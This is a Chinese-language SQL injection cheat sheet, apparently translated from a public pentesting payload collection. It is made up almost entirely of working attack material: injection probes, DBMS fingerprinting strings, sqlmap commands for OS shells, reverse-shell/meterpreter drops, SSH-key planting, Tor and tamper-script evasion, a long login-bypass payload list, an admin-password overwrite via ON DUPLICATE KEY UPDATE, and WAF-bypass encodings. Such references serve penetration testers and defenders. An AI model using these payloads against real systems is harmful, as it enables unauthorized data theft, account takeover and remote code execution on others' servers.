# SQL注入

> SQL注入攻击包括通过从客户端到应用的数据中插入或者“注入”SQL查询

进行SQL注入的主要目的有:

- 信息泄露
- 公开存储的数据
- 处理修改存储的数据(篡改)
- 绕过权限控制

## 目录

* [检测注入点](#检测注入点)
* [DBMS识别](#DBMS识别)
* [使用SQLmap进行SQL注入](#使用SQLmap进行SQL注入)
	* [SQLmap基本参数](#SQLmap基本参数)
	* [使用移动端状态来加载请求文件](#使用移动端状态来加载请求文件)
	* [在UserAgent/Header/Referer/Cookie数据头上进行注入](#在UserAgent/Header/Referer/Cookie数据头上进行注入)
	* [二次注入](#二次注入)
	* [Shell](#shell)
	* [使用SQLmap爬取网站并实施自动注入](#使用SQLmap爬取网站并实施自动注入)
	* [使用TOR网络](#使用TOR网络)
	* [使用代理](#使用代理)
	* [使用谷歌浏览器的cookie和代理](#使用谷歌浏览器的cookie和代理)
	* [使用后缀来篡改注入](#使用后缀来篡改注入)
	* [一些常用的可篡改选项](#一些常用的可篡改选项)
* [认证绕过](#认证绕过)
* [多种语言注入](#多种语言注入)
* [路由注入](#路由注入)
* [Insert Statement - ON DUPLICATE KEY UPDATE](#insert-statement---on-duplicate-key-update)
* [WAF Bypass](#waf-bypass)
* [参考](#参考)

## 检测注入点

检测是否存在SQL注入

简单字符

```sql
'
%27
"
%22
#
%23
;
%3B
)
Wildcard (*)
&apos;  # required for XML content
```

尝试多种编码

```sql
%%2727
%25%27
```

合并字符

```sql
`+HERP
'||'DERP
'+'herp
' 'DERP
'%20'HERP
'%2B'HERP
```

逻辑测试

```sql
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```

奇怪字符

```sql
Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
transformed into U+0022 QUOTATION MARK (")
Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
transformed into U+0027 APOSTROPHE (')
```

## DBMS识别

DBMS识别

```c
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```

## 使用SQLmap进行SQL注入

### SQLmap基本参数

```powershell
sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
```

### 使用移动端状态来加载请求文件

```powershell
sqlmap -r sqli.req --safe-url=http://10.10.10.10/ --mobile --safe-freq=1
```

### 在UserAgent/Header/Referer/Cookie数据头上进行注入

```powershell
python sqlmap.py -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
The injection is located at the '*'
```

### 二次注入

```powershell
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```

### Shell

```powershell
SQL Shell
python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell

Simple Shell
python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell

Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn

SSH Shell by dropping an SSH key
python sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
```

### 使用SQLmap爬取网站并实施自动注入

```powershell
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```

### 使用TOR网络

```powershell
sqlmap -u "http://www.target.com" --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
```

### 使用代理

```powershell
sqlmap -u "http://www.target.com" --proxy="http://127.0.0.1:8080"
```

### 使用谷歌浏览器的cookie和代理

```powershell
sqlmap -u "https://test.com/index.php?id=99" --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy "http://127.0.0.1:8080"  -f  --time-sec 15 --level 3
```

### 使用后缀来篡改注入

```powershell
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```

### 一些常用的可篡改选项

```powershell
tamper=name_of_the_tamper
```

| Tamper                       | Description                                                  |
| ---------------------------- | ------------------------------------------------------------ |
| 0x2char.py                   | Replaces each (MySQL) 0x<hex> encoded string with equivalent CONCAT(CHAR(),…) counterpart |
| apostrophemask.py            | Replaces apostrophe character with its UTF-8 full width counterpart |
| apostrophenullencode.py      | Replaces apostrophe character with its illegal double unicode counterpart |
| appendnullbyte.py            | Appends encoded NULL byte character at the end of payload    |
| base64encode.py              | Base64 all characters in a given payload                     |
| between.py                   | Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' |
| bluecoat.py                  | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator |
| chardoubleencode.py          | Double url-encodes all characters in a given payload (not processing already encoded) |
| charencode.py                | URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54) |
| charunicodeencode.py         | Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054) |
| charunicodeescape.py         | Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \u0053\u0045\u004C\u0045\u0043\u0054) |
| commalesslimit.py            | Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M' |
| commalessmid.py              | Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)' |
| commentbeforeparentheses.py  | Prepends (inline) comment before parentheses (e.g. ( -> /**/() |
| concat2concatws.py           | Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)' |
| charencode.py                | Url-encodes all characters in a given payload (not processing already encoded) |
| charunicodeencode.py         | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded) |
| equaltolike.py               | Replaces all occurances of operator equal ('=') with operator 'LIKE' |
| escapequotes.py              | Slash escape quotes (' and ")                                |
| greatest.py                  | Replaces greater than operator ('>') with 'GREATEST' counterpart |
| halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword             |
| htmlencode.py                | HTML encode (using code points) all non-alphanumeric characters (e.g. ‘ -> &#39;) |
| ifnull2casewhenisnull.py     | Replaces instances like ‘IFNULL(A, B)’ with ‘CASE WHEN ISNULL(A) THEN (B) ELSE (A) END’ counterpart |
| ifnull2ifisnull.py           | Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)' |
| informationschemacomment.py  | Add an inline comment (/**/) to the end of all occurrences of (MySQL) “information_schema” identifier |
| least.py                     | Replaces greater than operator (‘>’) with ‘LEAST’ counterpart |
| lowercase.py                 | Replaces each keyword character with lower case value (e.g. SELECT -> select) |
| modsecurityversioned.py      | Embraces complete query with versioned comment               |
| modsecurityzeroversioned.py  | Embraces complete query with zero-versioned comment          |
| multiplespaces.py            | Adds multiple spaces around SQL keywords                     |
| nonrecursivereplacement.py   | Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace("SELECT", "")) filters |
| overlongutf8.py              | Converts all characters in a given payload (not processing already encoded) |
| overlongutf8more.py          | Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94) |
| percentage.py                | Adds a percentage sign ('%') infront of each character       |
| plus2concat.py               | Replaces plus operator (‘+’) with (MsSQL) function CONCAT() counterpart |
| plus2fnconcat.py             | Replaces plus operator (‘+’) with (MsSQL) ODBC function {fn CONCAT()} counterpart |
| randomcase.py                | Replaces each keyword character with random case value       |
| randomcomments.py            | Add random comments to SQL keywords                          |
| securesphere.py              | Appends special crafted string                               |
| sp_password.py               | Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs |
| space2comment.py             | Replaces space character (' ') with comments                 |
| space2dash.py                | Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n') |
| space2hash.py                | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') |
| space2morehash.py            | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') |
| space2mssqlblank.py          | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
| space2mssqlhash.py           | Replaces space character (' ') with a pound character ('#') followed by a new line ('\n') |
| space2mysqlblank.py          | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
| space2mysqldash.py           | Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n') |
| space2plus.py                | Replaces space character (' ') with plus ('+')               |
| space2randomblank.py         | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
| symboliclogical.py           | Replaces AND and OR logical operators with their symbolic counterparts (&& and |
| unionalltounion.py           | Replaces UNION ALL SELECT with UNION SELECT                  |
| unmagicquotes.py             | Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) |
| uppercase.py                 | Replaces each keyword character with upper case value 'INSERT' |
| varnish.py                   | Append a HTTP header 'X-originating-IP'                      |
| versionedkeywords.py         | Encloses each non-function keyword with versioned MySQL comment |
| versionedmorekeywords.py     | Encloses each keyword with versioned MySQL comment           |
| xforwardedfor.py             | Append a fake HTTP header 'X-Forwarded-For'                  |

## 认证绕过

```sql
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

## Authentication Bypass (Raw MD5)

当使用md5数据时，pass参数将会以一个简单的字符串来查询而不是十六进制字符串

```php
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```

Allowing an attacker to craft a string with a `true` statement such as `' or 'SOMETHING`

允许攻击者使用“true”语句来生成payload(例如'or' SOMETHING)

```php
md5("ffifdyop", true) = 'or'6�]��!r,��b
```

这里有个例子 [http://web.jarvisoj.com:32772](http://web.jarvisoj.com:32772)

## 多种语言注入

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

## 路由注入

```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```

## Insert Statement - ON DUPLICATE KEY UPDATE

ON DUPLICATE KEY UPDATE 关键词被用来告诉MySQL当程序在表中插入已经存在行时需要做啥。我们可以利用这个来修改管理员密码。

```sql
插入使用的payload
  attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" --

查询看起来是这个样子：
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" -- ", "bcrypt_hash_of_your_password_input");

该查询将会插入用户“attacker_dummy@example.com”，并且插入“admin@example.com”，由于“admin@example.com”用户已经存在，所以 ON DUPLICATE KEY UPDATE将会告诉MySQL将此行的“password”更新为"bcrypt_hash_of_qwerty"。

之后我们就可以使用“ admin@example.com”和密码“ qwerty”进行身份验证！
```

## WAF Bypass

没有空间(%20) - 通过使用空白代替

```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```

没有空格 - 通过注释绕过

```sql
?id=1/*comment*/and/**/1=1/**/--
```

没有空格 - 使用括号绕过

```sql
?id=(1)and(1)=(1)--
```

没有逗号 - 使用OFFSET，FROM和JOIN绕过

```sql
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```

没有等于 - 通过使用LIKE/NOT/IN绕过

```sql
?id=1 and substring(version(),1,1)like(5)
?id=1 and substring(version(),1,1)not in(4,3)
?id=1 and substring(version(),1,1)in(4,3)
```

黑名单禁止关键词 - 通过改变大小写绕过

```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```

使用黑名单并且不区分大小写 - 使用对等符号

```sql
AND   -> &&
OR    -> ||
=     -> LIKE,REGEXP, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING
```

替换Information_schema.tables

```sql
select * from mysql.innodb_table_stats;
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |
| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |
...
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+

mysql> show tables in dvwa;
+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      |
| users          |
+----------------+
```

版本 Alternative

```sql
mysql> select @@innodb_version;
+------------------+
| @@innodb_version |
+------------------+
| 5.6.31           |
+------------------+

mysql> select @@version;
+-------------------------+
| @@version               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> mysql> select version();
+-------------------------+
| version()               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+
```

## 参考

* Detect SQLi
	* [Manual SQL Injection Discovery Tips](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
	* [NetSPI SQL Injection Wiki](https://sqlwiki.netspi.com/)
* MySQL:
	* [PentestMonkey's mySQL injection cheat sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
	* [Reiners mySQL injection Filter Evasion Cheatsheet](https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/)
	* [Alternative for Information_Schema.Tables in MySQL](https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/)
	* [The SQL Injection Knowledge base](https://websec.ca/kb/sql_injection)
* MSSQL:
	* [EvilSQL's Error/Union/Blind MSSQL Cheatsheet](http://evilsql.com/main/page2.php)
	* [PentestMonkey's MSSQL SQLi injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
* ORACLE:
	* [PentestMonkey's Oracle SQLi Cheatsheet](http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
* POSTGRESQL:
	* [PentestMonkey's Postgres SQLi Cheatsheet](http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
* Others
	* [SQLi Cheatsheet - NetSparker](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
	* [Access SQLi Cheatsheet](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
	* [PentestMonkey's Ingres SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet)
	* [Pentestmonkey's DB2 SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)
	* [Pentestmonkey's Informix SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet)
	* [SQLite3 Injection Cheat sheet](https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
	* [Ruby on Rails (Active Record) SQL Injection Guide](http://rails-sqli.org/)
	* [ForkBombers SQLMap Tamper Scripts Update](http://www.forkbombers.com/2016/07/sqlmap-tamper-scripts-update.html)
	* [SQLi in INSERT worse than SELECT](https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)
	* [Manual SQL Injection Tips](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
* Second Order:
	* [Analyzing CVE-2018-6376 – Joomla!, Second Order SQL Injection](https://www.notsosecure.com/analyzing-cve-2018-6376/)
	* [Exploiting Second Order SQLi Flaws by using Burp & Custom Sqlmap Tamper](https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/)
* Sqlmap:
	* [#SQLmap protip @zh4ck](https://twitter.com/zh4ck/status/972441560875970560)